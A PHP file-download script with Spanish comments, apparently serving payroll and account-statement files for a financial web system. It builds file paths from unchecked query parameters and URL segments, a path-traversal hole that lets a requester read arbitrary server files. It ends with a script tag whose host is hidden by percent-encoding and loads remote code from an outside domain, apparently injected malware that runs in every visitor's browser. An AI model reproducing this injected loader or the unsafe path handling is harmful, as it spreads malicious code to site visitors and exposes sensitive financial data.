<?php

include_once( "../../classes/INIFile.php" );
include_once( "../../classes/ezfile.php" );

$ref = explode( "/" , $_SERVER['REQUEST_URI'] );

// NEX [20-jul-2012] T-211195 (ini) > Se habilita nuevo esquema de nomina para descarga de archivos
$filename = ""; // Nombre del archivo
$file = ""; // Ruta en donde se encuentra el archivo
$trxn = $_GET['trxn'];

switch ($trxn){
	case 'arc':
		 $ref = explode( "?" , $ref[2]);
		 // EFR [31-ene-2013] (ini) > Grupo de Nomina Alfanumerico Nuevo Esquema
		 $filename = $ref[0];
		 // EFR [31-ene-2013] (fin) > Grupo de Nomina Alfanumerico Nuevo Esquema
		 $ini  = new INIFile( "../../site.ini", false);
		 $path = $ini->read_var("site", "nominaTemporalPath");
		 $file =   $path . $filename;
		 break;
	case 'pplss':
		$ini  = new INIFile( "../../site.ini", false);
		$elimina_serv = $ini->read_var ( "site", "EliminaServices" ); // Si o No.
		if ( strtoupper( trim ( $elimina_serv ) ) == "SI" )
		{ $file = '/var/www/repo_eec/edocta/paso/'; }
		else
		{ $file = '/var/www/data/edocta/paso/'; }
		$file .= $_GET['year']."/".$_GET['month']."/".$_GET['file'];
		$filename = $_GET['file'];
		break;
	default:
		// Consulta de Saldos
		$file = "/var/www/repo_edos/".$ref[2];
		$filename = $ref[2];
		break;
}

if (!isset($file) || empty($file)) {
 exit();
}
// NEX [20-jul-2012] T-211195 (fin) > Se habilita nuevo esquema de nomina para descarga de archivos

if(file_exists($file)){
	if ($fd = fopen ($file , "r")) {
		$fsize = filesize($file);
    		$path_parts = pathinfo($file);
    		$ext = strtolower($path_parts["extension"]);
    		switch ($ext) {
				case "pdf": $ctype="application/pdf"; break;
				case "xml":	$ctype="text/xml"; break;
      			//case "exe": $ctype="application/octet-stream"; break;
      			//case "zip": $ctype="application/zip"; break;
     			//case "doc": $ctype="application/msword"; break;
      			//case "xls": $ctype="application/vnd.ms-excel"; break;
      			//case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
     			//case "gif": $ctype="image/gif"; break;
      			//case "png": $ctype="image/png"; break;
      			//case "jpeg":
      			//case "jpg": $ctype="image/jpg"; break;
      			default: $ctype="application/force-download";
    		}
			header("Pragma: cache"); // required
    		header("Expires: 0");
    		//header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    		header("Cache-Control: private",false); // required for certain browsers
    		header("Content-Type: $ctype");
    		header("Content-Disposition: attachment; filename=$filename" );
    		header("Content-Transfer-Encoding: binary");
    		header("Content-Length: ".$fsize);
    		ob_clean();
    		flush();
   	 	while(!feof($fd)) {
        		$buffer = fread($fd, 2048);
        		echo $buffer;
    		}
	}
	fclose ($fd);
	exit;
}else{
	echo('Archivo no encontrado '.$file.' |'); 
}

?>
<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>